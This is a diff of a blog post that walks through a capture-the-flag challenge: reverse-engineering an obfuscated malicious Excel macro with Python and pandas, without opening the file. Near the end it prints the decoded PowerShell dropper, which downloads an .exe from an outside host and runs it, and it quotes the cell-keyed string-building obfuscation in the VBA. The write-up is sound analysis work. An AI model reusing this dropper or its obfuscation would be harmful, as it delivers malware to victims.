@@ -3,13 +3,14 @@ title = "Watching My Macros"
 date = "2024-04-18"
 author = "NuclearFarmboy"
 description = "For once I am trying to look at a malware dropper in Excel rather than trying to write it."
-draft = true
 +++
 
 {{< image src="/img/macro_reverse_engineering/alwayshasbeen.png" alt="And always will be..." position="center" style="width: 500px; height:auto;" >}}
 
 # Let's Reverse Engineer a Malicious Excel Macro!
 ### The Backstory
+**(NOTE: I began writing this in April of 2024, but since then I decided to get married so that put a delay on stuff!)**
+
 A few weeks ago I had some free time after playing enough *Helldivers II* for one evening (I totally didn't have to stop because I got a hand cramp), I decided to do my other computer hobby: CTFs. As you may all know, a Capture The Flag (CTF) competition is an event where you can put your computer skills to the test and solve fun(?) challenges and potentially win cool prizes! In my case I am not a very competitive person so I do these more often than not to just stretch the ol' brain and learn something cool, try some new technique, or to just muck about because I got a hand cramp playing *Helldivers II*. 
 
 ##### (This post was not sponsored by *Helldivers II*, Super Earth, or Managed Democracy) 
@@ -50,6 +51,8 @@ To which I just say
 Which is just a rebrand of my catchphrase I've said since I was a child ***"I'm about to try something stupid here."*** which never failed to terrify my parents and teachers.
 
 Nevertheless, I do concede that just clicking the **YOLO** *"Enable Macros"* button on the spreadsheet doesn't seem the most methodical approach so I decided to do something closer to the scientific method and make my 6th grade science teacher Mr. Connor proud. 
+
+So here is:
 
 ### "Cervando's Approach For Examining Potentially Malicious Spreadsheets While Being Only a Slight Idiot"™️
 
@@ -462,9 +465,9 @@ We see that it found some interesting indicators of compromise (IOCs) and potent
 - this VBA file somewhere utilizes the ```AutoOpen``` subroutine which is VBAs way of running the macro as soon as the workbook is opened
 - this VBA file somehwere uses the ```Shell``` command which may run a command on the command line
 - some Hex encoded strings
-- some Base64 encoded strings
-- and... a YouTube link that takes you to this straight up BANGER
-{{< youtube mYiBdMnIT88 >}}
+- **some Base64 encoded strings**
+- and... a YouTube link that would take you to a straight up banger of a song. Now this link has since been taken down but it did have this vibe to it:
+{{< youtube S1jWdeRKvvk >}}
 
 
 Now we could take the ```olevba --decode``` route to see what the Base64 strings say, but first let's keep exploring and look at what else is in this **VB**i**A**tch. Taking these results from the top, the first thing we see is that olevba found 3 ```.cls``` objects named *ThisWorkbook, Sheet1,* and *Sheet2*. Very imaginative. After 10 whole minutes on of reading I learned that ```.cls``` objects in VBA are *Class Modules* and have properties and methods that exist separately for each instance of the class. Neat. Basically the data of a specific instance of the class only exists for that instance even if there are multiple copies. Neat huh? But they're empty so who cares. 
@@ -563,7 +566,11 @@ And moving along we see what they wanted to accomplish with all these cells in l
     Next i
 {{< /code >}}
 
-It turns out they seed a random number generator, and then proceed to fill all 2,700 cells with random Base64 strings! To do this they utilize a the function they define in this module in lines ```26``` through ```40``` aptly called ```GenerateRandomBase64()```
+It turns out they seed a random number generator, and then proceed to fill all 2,700 cells with random Base64 strings! To do this they utilize a the function they define in this module in lines ```26``` through ```40``` aptly called ```GenerateRandomBase64()```. This is done for 3 major reasons:
+
+1. Fill the cells of data in a programatic and random way
+2. Ensure that the spreadsheet is easily regenerated with different data
+3. Change the hash/signature of the file should you want to reuse the spreadsheet
 
 {{< code language="visual-basic" title="Module1.bas lines:26-40" expand="expand" collapse="hide" isCollapsed="false">}}Function GenerateRandomBase64() As String
     Dim base64Chars As String
@@ -582,4 +589,314 @@ It turns out they seed a random number generator, and then proceed to fill all 2
 End Function
 {{< /code >}}
 
-This function generates an 8 character long random string that contains the Base64 characters, **BUT** while a scanner may think that these are all valid Base64 encoded strings, these turn out to be just random noise and a lot of it. While this module doesn't actually hide a payload, it does create a lot of Base64 data that could be overwhelming to analyze by simply having so much data. Had we not found this script, or had it been more obfuscated or even deleted afterwards, we could've spent (wasted) some time attempting to decode the data to see if we can find some potentially harmful strings, or other IOCs. Thankfully our procrastination paid off! Now onto the second module!
+This function generates an 8 character long random string that contains the Base64 characters, **BUT** while a scanner may think that these are all valid Base64 encoded strings, these turn out to be just random noise and a lot of it. While this module doesn't actually hide a payload, it does create a lot of Base64 data that could be overwhelming to analyze by simply having so much data to look over. Had we not found this script, or had it been more obfuscated or even deleted afterwards, we could've spent (wasted) some time attempting to decode the data to see if we can find some potentially harmful strings, or other IOCs. Thankfully our procrastination paid off! Now onto the second module!
+
+#### Step 4. This is where the fun begins...
+In the aptly named ```Module2.bas``` we see that is where the magic happens. The script looks complicated, but reading it is actually pretty straight forward. Starting at the beginning (because we live in a society) we see several things, namely the word ```Dim```. Now this is not referring to how my exgirlfriend would describe me, but rather it is the VBA way to declare a variable. So in this truncated snippet we see several variables being declared with their type being ```String```. These variables are:
+
+```t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d, e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e```
+
+While normal people may use descriptive variable names in either camelCase or snake_case (the obviously superior naming convention), for obfuscation purposes the authors of this malicious macro decided to use *very* long variable names to make it that much more difficult to understand what is happening. But thankfully their Kung-Fu is weak and we can see what is happening with just a little patience. 
+
+Focusing on just the first few lines of code we see that like all good malicious macros, it has the ```AutoOpen()``` function that runs whenever the spreadsheet is opened and macros are enabled. Immediately below that we start declaring the empty variable ```f``` of type ```String``` and more importantly the variable ```xc6fd40b407cb3aac0d068f54af14362e``` also of type ```String``` but this time with the value ```$OrA, ```. We then have **SEVERAL** ```IF/End If``` blocks where the statement checks several cells for a particular value, and if the cell has that value, we append a string to a variable such as ```xc6fd40b407cb3aac0d068f54af14362e```. 
+
+{{< code language="visual-basic" title="Module2.bas lines:1-11" expand="expand" collapse="hide" isCollapsed="false">}}Sub AutoOpen()
+Dim Retval
+Dim f As String
+Dim t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d, e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e As String
+xc6fd40b407cb3aac0d068f54af14362e = "$OrA, "
+If Sheets("Sheet2").Range("M62").Value = "Iuzaz/iA" Then
+xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
+End If
+If Sheets("Sheet2").Range("G80").Value = "bAcDPl8D" Then
+xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
+End If
+...
+If Sheets("Sheet2").Range("E90").Value = "HP5LRFms" Then
+e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
+End If
+...
+If Sheets("Sheet2").Range("T34").Value = "9u2uF9nM" Then
+qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
+End If
+{{< /code >}}
+
+In other words, the whole document programatically fills ```Sheet2``` with random snippets of base64 strings, and ```Module2.bas``` goes and looks at specific cells within ```Sheet2```, and if they have a particular value, it starts to build a string and it does this for several variables such as ```e5b138e644d624905ca8d47c3b8a2cf41``` and ```qe32cd94f940ea527cf84654613d4fb5d```. 
+
+At the end of the ```IF/End If``` blocks in ```Module2.bas``` we see the script builds the malicious string in the correct order by concatenating the strings in each of the variables it built into the variable ```f```, and then executes it with ```Shell(f,0)```. It will never cease to baffle me why VBA can just run a shell, but yet here we are:
+
+{{< code language="visual-basic" title="Module2.bas" expand="expand" collapse="hide" isCollapsed="false">}}...
+f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 + z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
+Retval = Shell(f, 0)
+...
+{{< /code >}}
+
+Now I know this is confusing, but let me use a Python example. 
+
+Say we have an array of length 10 with the following data:
+
+{{< code language="python" title="malicious_macro.py" expand="expand" collapse="hide" isCollapsed="false">}}my_array = ["a","b","c","d","e","f","g","h","i","j"]
+{{< /code >}}
+
+And from this array I write the following script:
+{{< code language="python" title="malicious_macro.py" expand="expand" collapse="hide" isCollapsed="false">}}my_array = ["a","b","c","d","e","f","g","h","i","j"]
+mal_string1 = ""
+mal_string2 = ""
+mal_string3 = ""
+if my_array[0] == "a":
+    mal_string1 += "llo"
+if my_array[1] == "X":
+    mal_string2 += "%!#"
+if my_array[2] == "b":
+    mal_string2 += " Wor"
+if my_array[3] == "c":
+    mal_string2 += "ld!"
+if my_array[9]== "j":
+    mal_string3 = "He"
+
+final_string = mal_string3 + mal_string1 + mal_string2
+{{< /code >}}
+
+Looking at this script we see that based on the contents of the array, we determine the contents of each variable, and then we build a final variable ```final_string``` from these smaller substrings in whatever order we see fit. We can even add ```If``` statements we know will not be true to confuse an analyst and further obfuscate the script like we see in line 7 with the ```if my_array[1] == "X":``` statment. Ultimaterly we end up building the string ```Hello World!``` but we make it hard for a human to deduce this.
+
+Luckily for me, I am too lazy to read things and would much rather have a computer read stuff for me.
+
+#### Step 5. To YOLO or not to YOLO
+
+At this point I am tempted to modify the VBA script and have it do the dirty work for me by printing the value of that malicious string ```f```, but I am feeling a bit cheeky and instead would like to do it a less YOLO-y way and try to get this string without ever actually opening the spreadsheet in Excel (it *totally* has **nothing** to do with the fact that I am running this on Linux and Mac so I have no way to do this and the fact that I also hate myself enought to do this the hard way).
+
+Looking at the contents in ```Module2.bas``` we thankfully see that all of the ```If/End If``` conditionals to build the malicious string look at the contents of various cells in ```Sheet2``` and don't jump around various sheets. So i think first order of business is to extract those contents. To do this in Kali we will install and use the Python application ```xlsx2csv``` which if the name isn't obvious, converst xlsx contents to a CSV.
+
+So we install it with 
+```bash
+$ pip install xlsx2csv
+```
+and then we simply use 
+```bash
+$ xlsx2csv deals.xlsm --all > deals.csv
+```
+and we now have the contents of the xlsm file stored as a neat CSV file. The raw dump of this will be avaialble to you at https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/deals.csv
+
+From this CSV we then pull out ```Sheet2``` and we now have a CSV of all the contents of sheet 2. This will be available to you at https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/sheet2.csv and is literally just a lot of base64 snippets separated by commas. Ain't life grand?
+
+Now here is where we hit a bit of a hiccup, the ```Module2.bas``` script looks at the contents of a cell by referenicng its column and then row number in the following format where ```E40``` is column E, row 40. Our CSV does not have that. But that's no problem, because we have Python and Pandas. Now I will say that I took a peek at ```Sheet2.csv``` and saw that there are 27 columns, so in Python when I generate the column names as the capital letters A-Z I do have to append a ```AA``` to that list as a column name. 
+
+{{< code language="python" title="deals.py" expand="expand" collapse="hide" isCollapsed="false">}}import string
+import pandas as pd
+import numpy as np
+
+col_names = list(string.ascii_uppercase) + ['AA']
+
+df = pd.read_csv('sheet2.csv', names=col_names)
+{{< /code >}}
+
+And doing a quick print/sanity check of this we see that it's all coming together nicely.
+
+{{< image src="/img/macro_reverse_engineering/sheet2.png" alt="A freak in the (Excel) sheets" position="center" style="width: 800px; height:auto;" >}}
+
+So now we have the technology. We have the skills (I think). Let's keep building ```deals.py```.
+
+#### Step 6. LEZDUIT!
+
+So now we need to extract what the actual things we care about in ```Module2.bas``` and convert it into python. Thankfully with some regex and Python knowledge this is actually super easy, barely an inconvenience. 
+
+First we need to take those string declarations from VBA:
+```
+Dim t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d,
+ e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, 
+ z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e As String
+```
+and we Pythonize them
+```python
+t53df028c67b2f07f1069866e345c8b85 = ''
+qe32cd94f940ea527cf84654613d4fb5d = ''
+e5b138e644d624905ca8d47c3b8a2cf41 = ''
+tfd753b886f3bd1f6da1a84488dee93f9 = ''
+z92ea38976d53e8b557cd5bbc2cd3e0f8 = ''
+xc6fd40b407cb3aac0d068f54af14362e = ''
+```
+next we will take the VBA ```If/End If``` statements such as:
+```
+If Sheets("Sheet2").Range("M62").Value = "Iuzaz/iA" Then
+xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
+End If
+```
+and Pythonize AND Pandas-ize them! (Note I had to flip the Row/Column notation for Pandas):
+```python
+if df.at["M",62] == "Iuzaz/iA":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
+```
+
+and finally our malicious string constructor is basically already Pythonized
+```python
+f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + 
+e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 + 
+z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
+```
+
+so our final ```deals.py``` looks like:
+{{< code language="python" title="deals.py" expand="expand" collapse="hide" isCollapsed="false">}}import string
+import pandas as pd
+import numpy as np
+
+col_names = list(string.ascii_uppercase) + ['AA']
+
+df = pd.read_csv('sheet2.csv', names=col_names)
+df.index = np.arange(1, len(df) + 1)
+
+t53df028c67b2f07f1069866e345c8b85 = ''
+qe32cd94f940ea527cf84654613d4fb5d = ''
+e5b138e644d624905ca8d47c3b8a2cf41 = ''
+tfd753b886f3bd1f6da1a84488dee93f9 = ''
+z92ea38976d53e8b557cd5bbc2cd3e0f8 = ''
+xc6fd40b407cb3aac0d068f54af14362e = ''
+
+print("Data Frame:\n--------")
+print(df)
+
+if df.at[62,"M"] == "Iuzaz/iA":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
+if df.at[80,"G"] == "bAcDPl8D":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
+e5b138e644d624905ca8d47c3b8a2cf41 = " = '"
+if df.at[31,"P"] == "aI3bH4Rd":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "http"
+if df.at[50,"B"] == "4L3bnaGQ":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "://f"
+if df.at[32,"B"] == "QyycTMPU":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "e-Ite"
+if df.at[47,"K"] == "0kIbOvsu":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "m $jri"
+if df.at[45,"B"] == "/hRdSmbG":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + ";brea"
+if df.at[27,"D"] == "y9hFUyA8":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "ruit"
+if df.at[91,"A"] == "De5234dF":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".ret3"
+if df.at[35,"I"] == "DP7jRT2v":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".gan"
+if df.at[48,"W"] == "/O/w/o57":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "k;} c"
+if df.at[18,"R"] == "FOtBe4id":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "atch "
+if df.at[6,"W"] == "9Vo7IQ+/":
+    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "{}"""
+if df.at[24,"U"] == "hmDEjcAE":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "g/ma"
+if df.at[96,"C"] == "1eDPj4Rc":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "lwar"
+if df.at[93,"B"] == "A72nfg/f":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".rds8"
+if df.at[90,"E"] == "HP5LRFms":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
+tfd753b886f3bd1f6da1a84488dee93f9 = "akrz"
+if df.at[39,"G"] == "MZZ/er++":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "f3zsd"
+if df.at[93,"B"] == "ZX42cd+3":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2832"
+if df.at[15,"I"] == "e9x9ME+E":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "0918"
+if df.at[46,"T"] == "7b69F2SI":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2afd"
+if df.at[25,"N"] == "Ga/NUmJu":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "CNTA"
+if df.at[26,"N"] == "C1hrOgDr":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + " = '"
+if df.at[58,"C"] == "PoX7qGEp":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "banA"
+if df.at[53,"B"] == "see2d/f":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "Fl0dd"
+if df.at[2,"Q"] == "VKVTo5f+":
+    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "NA-H"
+t53df028c67b2f07f1069866e345c8b85 = "p"
+if df.at[84,"L"] == "GSPMnc83":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "oWe"
+if df.at[35,"H"] == "aCxE//3x":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "ACew"
+if df.at[95,"R"] == "uIDW54Re":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "Rs"
+if df.at[24,"A"] == "PKRtszin":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "HELL"
+if df.at[33,"G"] == "ccEsz3te":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "L3c33"
+if df.at[31,"P"] == "aI3bH4Rd":
+    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + " -c"
+if df.at[49,"Z"] == "oKnlcgpo":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "4';$"
+if df.at[57,"F"] == "JoTVytPM":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "jri="
+if df.at[37,"M"] == "y7MxjsAO":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "$env:"
+if df.at[20,"E"] == "ap0EvV5r":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "publ"
+z92ea38976d53e8b557cd5bbc2cd3e0f8 = "\'+$"
+if df.at[11,"D"] == "Q/GXajeM":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "CNTA"
+if df.at[45,"B"] == "/hRdSmbG":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "+'.ex"
+if df.at[85,"D"] == "y4/6D38p":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "e';tr"
+if df.at[2,"P"] == "E45tTsBe":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "4d2dx"
+if df.at[72,"O"] == "lD3Ob4eQ":
+    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "ic+'"
+qe32cd94f940ea527cf84654613d4fb5d = "omm"
+if df.at[24,"P"] == "d/v8oiH9":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "and"
+if df.at[22,"V"] == "dI6oBK/K":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " """
+if df.at[1,"G"] == "zJ1AdN0x":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$oa"
+if df.at[93,"Y"] == "E/5234dF":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "e$3fn"
+if df.at[12,"A"] == "X42fc3/=":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "av3ei"
+if df.at[57,"F"] == "JoTVytPM":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "K ="
+if df.at[99,"L"] == "t8PygQka":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " ne"
+if df.at[31,"X"] == "gGJBD5tp":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "w-o"
+if df.at[42,"C"] == "Dq7Pu9Tm":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bjec"
+if df.at[22,"D"] == "X42/=rrE":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "aoX3&i"
+if df.at[34,"T"] == "9u2uF9nM":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
+if df.at[5,"G"] == "cp+qRR+N":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t.We"
+if df.at[17,"O"] == "Q8z4cV/f":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bCli"
+if df.at[50,"Y"] == "OML7UOYq":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "ent;"
+if df.at[41,"P"] == "bG9LxJvN":
+    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$OrA"
+if df.at[58,"L"] == "qK02fT5b":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "y{$oa"
+if df.at[47,"P"] == "hXelsG2H":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "K.Dow"
+if df.at[2,"A"] == "RcPl3722":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "Ry.is"
+if df.at[64,"G"] == "Kvap5Ma0":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "nload"
+if df.at[76,"H"] == "OjgR3YGk":
+    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "File("
+
+f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d \
++ e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 \
++ z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
+
+print("Malicious Command\n--------")
+print(f)
+{{< /code >}}
+
+and so we run it and we get the malicious command that the flag wanted us to get.
+{{< image src="/img/macro_reverse_engineering/malicious_output.png" alt="your Kung Fu was weak." position="center" style="width: 800px; height:auto;" >}}
+
+and here it is in all its glory. Notice that even here they try to do some obfuscation by splitting the URL and putting it out of order ad even trying to obfuscate the word "PowerShell"
+```
+poWeRsHELL -command $oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+''+$CNTA+'.exe';try{$oaK.DownloadFile($jri);Invoke-Item $jri;break;} catch {}
+```
+### Final Thoughts
+It took me maybe an hour or two to do this challenge the first time, and I remember really enjoying it. It then took me 10 months to write that report. In that time I got married, moved, and have done so much, but I always wanted to come back and write this so that others could go on this same learning experience. Even to this day, malicious macros continue to be a thing and being able to do the analysis of a known malicious document without actually running the document is pretty cool if you ask me. (I am a nerd so you probably shouldn't). Hopefully you enjoyed this, learned something, and if you are still reading this please go outside and touch some grass for me as I continue to push buttons on my computer. 
+
